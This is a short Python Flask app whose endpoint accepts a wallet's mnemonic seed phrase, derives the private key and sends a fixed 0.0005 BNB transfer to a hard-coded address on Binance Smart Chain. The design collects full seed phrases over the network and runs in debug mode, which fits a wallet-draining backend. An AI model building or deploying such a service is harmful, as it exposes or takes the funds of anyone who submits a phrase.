from flask import Flask, request, jsonify
from mnemonic import Mnemonic
from eth_keys import keys
from eth_utils import to_checksum_address, to_hex
import bip32utils
from web3 import Web3, HTTPProvider

app = Flask(__name__)

# Static receiver's address and amount on BSC
receiver_address = "0xce3096170735312bd7309810957b68c86b88ec3a"
amount = 0.0005  # Static amount in BNB

@app.route('/send_transaction', methods=['POST'])
def send_transaction():
    # Extract mnemonic phrase from request
    data = request.json
    mnemonic_phrase = data.get('mnemonic_phrase')

    # Validate input
    if not mnemonic_phrase:
        return jsonify({'error': 'Missing required parameters'}), 400

    # Generate a seed from the mnemonic
    mnemo = Mnemonic("english")
    seed = mnemo.to_seed(mnemonic_phrase)

    # Derive the private key
    hdp = bip32utils.BIP32_HARDEN
    path = [44 + hdp, 60 + hdp, 0 + hdp, 0, 0]
    key = bip32utils.BIP32Key.fromEntropy(seed)
    for index in path:
        key = key.ChildKey(index)

    private_key_bytes = key.PrivateKey()
    private_key = keys.PrivateKey(private_key_bytes)

    # Derive the public address from the private key
    public_key = private_key.public_key
    address = to_checksum_address(public_key.to_address())

    # Connect to a Binance Smart Chain node
    w3 = Web3(HTTPProvider('https://bsc-dataseed.binance.org/'))
    if not w3.is_connected():
        return jsonify({"error": "Failed to connect to the BSC node"}), 500

    # Set transaction details
    nonce = w3.eth.get_transaction_count(address)
    gas_price = w3.eth.gas_price
    gas_limit = 21000  # Standard gas limit for BNB transfer
    value = w3.to_wei(amount, 'ether')  # Convert static amount to Wei

    # Create transaction object
    transaction = {
        'to': to_checksum_address(receiver_address),
        'value': value,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'nonce': nonce,
        'chainId': 56  # BSC Mainnet chain ID
    }

    # Sign the transaction with the private key
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key.to_hex())

    # Send the transaction
    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)

    # Return the transaction hash
    return jsonify({'transaction_hash': to_hex(txn_hash)}), 200

if __name__ == '__main__':
    app.run(debug=True)
